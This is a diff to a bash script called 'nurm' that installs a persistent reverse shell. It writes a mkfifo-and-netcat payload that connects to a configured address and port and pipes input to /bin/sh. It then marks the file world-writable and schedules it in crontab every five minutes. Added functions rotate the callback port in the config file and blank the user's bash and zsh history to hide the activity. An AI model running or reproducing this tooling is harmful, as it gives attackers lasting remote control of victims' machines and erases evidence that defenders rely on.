@@ -1,15 +1,15 @@
 #!/bin/bash
 . nurm.conf
-while getopts ":a:cp:f:" opt; do
+while getopts ":a:p:f:" opt; do
         case ${opt} in
                 a )
-                        address=$OPTARG
+			address=$OPTARG
                         ;;
                 p )
-                        port=$OPTARG
-                        ;;
+			port=$OPTARG
+			;;
                 f )
-                        filepath=$OPTARG
+		        filepath=$OPTARG
                         ;;
                 \? )
                         echo "Invalid Usage!"
@@ -18,23 +18,52 @@ while getopts ":a:cp:f:" opt; do
                 : )
                         echo "Usage: ./nurm [-a <address>] [-p <port>] [-f <full-path-file>]"
                         ;;
-		c )	
-			if ! [ -z ${dfile} ]; then
-        			echo "mkfifo /tmp/puesrrz; nc $daddr $dport 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $dfile 2>/dev/null
-        			chmod 777 $dfile 2>/dev/null
-       			 	(crontab -l 2>/dev/null; echo "*/5 * * * * $dfile ") 2>/dev/null | crontab -
-				sed '3d' nurm.conf > tmp
-				tport=$(($dport+1))
-				echo "dport=$tport" >> tmp
-				cat tmp > nurm.conf
-				rm tmp
-			else
-				echo "misconfigured config file. Aborting all process"
-			fi
         esac
 done
-if ! [ -z ${filepath} ]; then
-        echo "mkfifo /tmp/puesrrz; nc $address $port 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $filepath 2>/dev/null
-        chmod 777 $filepath 2>/dev/null
-        (crontab -l 2>/dev/null; echo "*/5 * * * * $filepath ") 2>/dev/null | crontab - 
-fi
+
+function inject() {
+	if ! [ -z ${filepath} ]; then
+        	echo "mkfifo /tmp/puesrrz; nc $address $port 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $filepath 2>/dev/null
+        	chmod 777 $filepath 2>/dev/null
+        	(crontab -l 2>/dev/null; echo "*/5 * * * * $filepath ") 2>/dev/null | crontab - 
+		if ! [ -z ${dport} ]; then
+		       	increment
+	       	fi
+		echo "Operation completed."
+	fi
+}
+
+function increment() {
+	sed '4d' nurm.conf > tmp
+	tport=$(($dport+$incval))
+	echo "dport=$tport" >> tmp
+	cat tmp > nurm.conf
+	rm tmp
+}
+
+function clearhistory() {
+	echo " " > ~/.bash_history
+	echo " " > ~/.zsh_history
+}
+
+function checkval() {
+	if [ -z ${filepath} ]; then
+		if ! [ -z ${dfile} ];then
+			filepath=$dfile
+		fi
+	fi
+	if [ -z ${port} ]; then
+		if ! [ -z ${dport} ];then
+			port=$dport
+		fi
+	fi
+	if [ -z ${address} ]; then
+		if ! [ -z ${daddr} ];then
+			address=$daddr
+		fi
+	fi
+}
+
+checkval
+inject
+clearhistory
